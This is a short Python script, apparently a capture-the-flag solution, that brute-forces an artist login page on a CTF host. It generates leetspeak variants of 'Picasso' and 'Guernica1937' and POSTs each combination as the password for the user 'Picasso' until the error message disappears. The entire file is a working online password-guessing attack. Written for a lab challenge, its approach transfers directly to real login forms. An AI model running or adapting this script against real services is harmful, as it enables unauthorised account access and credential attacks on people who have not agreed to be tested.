import requests
from tqdm import tqdm

URL = 'https://leekycomics.ctf.intigriti.io/artist_login'

leet_map = {
    'p': [],
    'i': ['1', '!', '|'],
    'c': [],
    'a': ['4', '@'],
    's': ['5', '$', 'S'],
    'o': ['0'],

    'g': ['9', 'G'],
    'u': [],
    'e': ['3'],
    'r': [],
    'n': [],
    
    '1': ['!', '|'],
    '9': [],
    '3': [],
    '7': []
}


def to_leet(word, include_non_leet=False):
    if not word:
        return ['']

    first_char = word[0].lower()

    char_replacements = leet_map.get(first_char, [first_char])
    
    if include_non_leet:
        if first_char.lower() not in char_replacements:
            char_replacements.append(first_char.lower())
        
        if first_char.upper() not in char_replacements:
            char_replacements.append(first_char.upper())
    
    suffixes = to_leet(word[1:], include_non_leet=include_non_leet)
    variations = []
    for replacement in char_replacements:
        for suffix in suffixes:
            variations.append(replacement + suffix)
    return variations


LOGINS = to_leet('Picasso', True)
PASSWORDS = to_leet('Guernica1937', True)
ENDINGS = ['', '?']

print('logins:', len(LOGINS), 'passwords:', len(PASSWORDS), 'endings:', len(ENDINGS))

for i in tqdm(range(len(PASSWORDS))):
  for j in tqdm(range(len(LOGINS))):
    for k in range(len(ENDINGS)):
      password = LOGINS[j] + PASSWORDS[i] + ENDINGS[k]  #  f"{line.strip()}32:password:Mich3l@ngel0$ist1n3!511?",
      s = requests.post(URL, data={
          "username": "Picasso",
          "password": password,
          "otp": "12",
      })

      if not("Incorrect Password." in s.text):
        print(i)
        print(password)
        print(password)
        print(password)
        print(password)
        print(password)
        print(password)
        print(password)
        input()
